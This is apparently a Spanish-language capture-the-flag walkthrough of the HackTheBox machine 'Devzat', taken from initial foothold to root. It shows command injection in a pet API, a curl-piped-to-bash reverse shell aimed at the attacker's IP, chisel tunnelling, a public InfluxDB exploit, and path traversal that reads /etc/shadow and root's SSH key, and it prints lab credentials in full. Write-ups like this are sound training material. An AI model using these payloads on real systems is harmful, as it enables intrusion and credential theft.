# Devzat

![](../../assets/img/Pasted_image_20260727111332.png)

- devzat.htb
- Whatweb
http://devzat.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[patrick@devzat.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.136.15], JQuery, Script, Title[devzat - where the devs at]

- 8000
*Golang x/crypto/ssh*

![](../../assets/img/Pasted_image_20260727111636.png)

- 80
Vemos que la web nos invita a

![](../../assets/img/Pasted_image_20260727111822.png)

Intentamos conectarnos con un usuario cualquiera

![](../../assets/img/Pasted_image_20260727111911.png)

Nos da error, le pasaremos que el tipo de key es *ssh-rsa*
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -l qarlg devzat.htb -p 8000
```

![](../../assets/img/Pasted_image_20260727112312.png)

- Nos hemos  conectado a lo que parece un chat, de hecho si probamos a conectarnos con otro usuario *test* podemos ver los mensajes del otro usuario

- Dentro del propio chat nos recomienda hacer */help* para ver qué comandos podemos correr

![](../../assets/img/Pasted_image_20260727112539.png)

Podemos
- Ver salas
```bash
/room
```

o mover a otra sala
```bash
/room #nombre
```

- Formatear tablas, encabezados, itálica, etc -> posible XSS
- Enviar mensajes directos
```bash
=user <msg>
```

- Soporte para zona horaria
```bash
/tz Continent/City
```

- Jugar al tic tac toe y hangman
```bash
/tic
```

```bash
/hang <word>
```

- Nos muestra un recurso bulkseotools.com/add-remove-line-breaks.php para sustituir líneas

- Podemos ejecutar comandos con */commands*

![](../../assets/img/Pasted_image_20260727113204.png)

- Probamos varios exploits de golang, gogs, ssh pero no parece ir por ahí

- Fuzzeamos directorios
```bash
wfuzz -c -t 200 --hc=404 --hh=6527 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://devzat.htb/FUZZ/
```

![](../../assets/img/Pasted_image_20260727121752.png)

- Fuzzeamos subdominios
```bash
wfuzz -c -t 200 --hc=302 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devzat.htb" http://devzat.htb/
```

**pets.devzat.htb**

![](../../assets/img/Pasted_image_20260727122300.png)

Vemos lo que parece una lista de mascotas donde podemos añadir nuevas con un nombre y un choice
- Whatweb
http://pets.devzat.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[My genious go pet server], IP[10.129.136.15], Script[module], Title[Pet Inventory]

- Burp para probar SQLi, NoSQLi Y posibles errores no controlados
Al añadir mascotas el sistema las borra automáticamente
- Si introducimos algo que no esté en el choice nos aparece *exit status 1*

![](../../assets/img/Pasted_image_20260727125039.png)

- Parece que corre algún tipo de comando en linux
```bash
echo $!
```

nos muestra el exit status del comando ejecutado anterior en la bash

- Fuzzeamos el nuevo subdominio
```bash
gobuster dir -u http://pets.devzat.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,js,txt --exlude-length 510
```

![](../../assets/img/Pasted_image_20260727130616.png)

- /build -> Encontramos dos js que no parecen tener mucha relevancia
- /.git -> Nos clonaremos el repositorio
```bash
wget -r http://pets.devzat.htb/.git
```

- PODRÍAMOS recomponer el repositorio con
```bash
git reset --hard
```

- Entramos al oculto */.git* para husmear
```bash
git log -p
```

![](../../assets/img/Pasted_image_20260727131217.png)

- En el segundo commit
```bash
git show 464614f32483e1fde60ee53f5d3b4d468d80ff62
```

vemos lo que parece una API

![](../../assets/img/Pasted_image_20260727131717.png)

- Vemos lo que parece un usuario **nil**
- El servicio antes escuchaba en el puerto 5000 del servidor

- Vemos que existe diferencias en el binario **petshop**

![](../../assets/img/Pasted_image_20260727132849.png)

```bash
git show 464614f:petshop > petshop.old
git show ef07a04:petshop > petshop.new
```

![](../../assets/img/Pasted_image_20260727132651.png)

- El archivo es **main.go**, iremos a inspeccionarlo
```bash
git show ef07a04ebb2fc92cf74a39e0e4b843630666a705:main.go
```

- Vemos una línea crítica

![](../../assets/img/Pasted_image_20260727133719.png)

- Por cada animal que le llega llama a una función *loadCharacter(species string)* la cual ejecuta directamente en el sistema el comando
```bash
sh -c "cat characteristics/especie+"
```

- Probaremos a inyectar código en el exec de la forma
```bash
specie; commando
```

Usaremos burp y pondremos en la petición

![](../../assets/img/Pasted_image_20260727134149.png)

```bash
Cat;id
```

Al recargar rápido la pagina (porque lo borra rápido automáticamente)

![](../../assets/img/Pasted_image_20260727134132.png)

Vemos que se produce el RCE

- Lanzaremos una revshell con curl
```bash
"species":"Cat;curl http://10.10.16.179|bash"
```

![](../../assets/img/Pasted_image_20260727134607.png)

patrick

## Escalada

SUID -> /usr/lib/openssh/ssh-keysign -> Nada en principio
CAP -> Nada
USUARIOS -> *patrick -> catherine -> root*

- Vemos puertos locales
```bash
ss -nltp
```

![](../../assets/img/Pasted_image_20260727185100.png)

```bash
curl localhost:5000
```

vemos el pet inventory
- Con la info que teníamos antes sabemos que reside una API en la dirección *localhost:5000/api/pet*
```bash
curl localhost:5000/api/pet
```

-> nos devuelve en json todos los datos de los nombres y descripciones de los animales

![](../../assets/img/Pasted_image_20260727185442.png)

- No parece que podamos hacer mucho en principio

- Vemos otro puerto el **8443**
Intentaremos ver que corre
```bash
nc localhost 8443
```

-> No existe nc
```bash
telnet localhost 8443
```

-> Es un ssh 2.0 -> el devchat
```bash
ssh test@localhost -p 8443
```

Nos conecta al mismo chat que teníamos acceso desde el puerto 8000 visible externamente

- Vemos que existe un apparmor, que puede ser que tengamos que tenerlo en cuenta más tarde

- No vemos nada interesante en */etc/cron.d*

- Nos pasamos y ejecutamos *linpeas.sh*
/etc/apache2/sites-enabled/000-default.conf -> Nada
/home/catherine/.profile -> Nada
/snap/core18/2074/usr/share/keyrings/ubuntu-archive-removed-keys.gpg -> Nada
/home/catherine/.bash_history -> Nada

- Vamos a utilizar chisel par hacer *port forwarding* de los puertos 8086 8443 y 5000
Nos lo pasamos a la máquina víctima con los mismos números de puertos
- En Kali
```bash
./chisel server --reverse -p 1234
```

Con --remote el cliente puede pedirle al servidor (kali) que abra puertos
- En MV
```bash
./chisel client 10.10.16.179:1234 R:8086:127.0.0.1:8086 R:8443:127.0.0.1:8443 R:5000:127.0.0.1:5000
```

- Hacemos un escaneo de servicios con *nmap*
```bash
nmap -sCV -p8086,8443,5000 127.0.0.1
```

- 5000 http Golang net/http server
- 8086 y 8443

![](../../assets/img/Pasted_image_20260727204558.png)

- Buscamos qué es Influx DB y si tiene vulnerabilidades conocidas

![](../../assets/img/Pasted_image_20260727204717.png)

- Encontramos un exploit
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
```bash
python3 exploit.py
```

localhost - 8086 - user.txt

![](../../assets/img/Pasted_image_20260727205751.png)

Obtenemos las bases de datos -> nos interesa **devzat**

- Nos deja probar pocos comandos
```bash
SHOW MEASUREMENTS
```

![](../../assets/img/Pasted_image_20260727210608.png)

- Vemos que hay un value **"user"** con una columna "name" -> entendemos que user es la tabla

- Intentamos hacer un select de esa tabla
```bash
SELECT * FROM "user"
```

Vemos credenciales

![](../../assets/img/Pasted_image_20260727210707.png)

catherine:woBeeYareedahc7Oogeephies7Aiseci

-
```bash
su catherine
```

catherine

- SUDO -> Nada
- linpeas.sh
Proceso root

![](../../assets/img/Pasted_image_20260727212019.png)

keys

![](../../assets/img/Pasted_image_20260727212205.png)

En principio no hay mucho más

- Vamos a inspeccionar el puerto 8443 que hemos traído a nuestra máquina por port forwarding
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa hartometienes@localhost -p 8443
```

Observamos que hay un comando nuevo -> **/file**

![](../../assets/img/Pasted_image_20260727212731.png)

Nos pide una contraseña

![](../../assets/img/Pasted_image_20260727212844.png)

Probando parece que los argumentos son
```bash
/file <archivo> <pswd>
```

Intento con las credenciales exfiltradas de la base de datos pero no parece ser ninguna

- Buscamos por archivos cuyo usuario sea *cactherine* y eliminamos los irrelevantes
```bash
find / -type f -user catherine 2>/dev/null | grep -vE "sys|proc"
```

![](../../assets/img/Pasted_image_20260727222445.png)

Encontramos un backup del entorno de desarrollo
**/var/backups/devzat-dev.zip**

- Buscaremos por la palabra *file* por ejemplo para intentar encontrar algún match que pueda contener la contraseña para subir archivos
```bash
grep -r -i file
```

- Vemos que el archivo **commands.go** es el que contiene todos los matches de la palabra *file*
Inspeccionamos el archivo y vemos una validación muy realista

![](../../assets/img/Pasted_image_20260727222743.png)

CeilingCatStillAThingIn2021?

- Intentaremos ahora subir algún archivo privilegiado de la máquina
Nos conectamos desde la propia máquina víctima al puerto 8443
```bash
/file /etc/passwd CeilingCatStillAThingIn2021?
```

![](../../assets/img/Pasted_image_20260727223212.png)

- Intentaremos retroceder con un path traversal
```bash
/file /../../../etc/shadow CeilingCatStillAThingIn2021?
```

![](../../assets/img/Pasted_image_20260727223323.png)

El hash:\$6$DKdyL4hqyhhxcRyc$8N.1K/dHPqLb7VSB0IvfB.uhIKsH7IeGP/iyTRSYImFiAawsaUOKs/TWe0DCp5wSscYvi.XjX8JPe6lZNnEmH/
Premio

- Buscamos también si existe un id_rsa en root
```bash
/file /../../../root/.ssh/id_rsa CeilingCatStillAThingIn2021?
```

![](../../assets/img/Pasted_image_20260727223601.png)

Nos la pegamos en un archivo *id_rsa*

-
```bash
ssh root@devzat.htb -i id_rsa
```

root
